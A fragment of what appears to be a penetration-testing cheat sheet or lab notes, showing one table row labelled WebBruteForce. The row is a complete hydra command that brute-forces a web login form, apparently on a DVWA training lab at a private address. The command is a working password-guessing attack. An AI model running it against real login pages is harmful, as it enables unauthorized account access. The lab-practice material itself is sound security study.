...
| **WebBruteForce** | `hydra 10.0.0.20 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=<your_cookie>; security=low:Username and/or password incorrect' -l admin -P /tmp/pass.txt` |
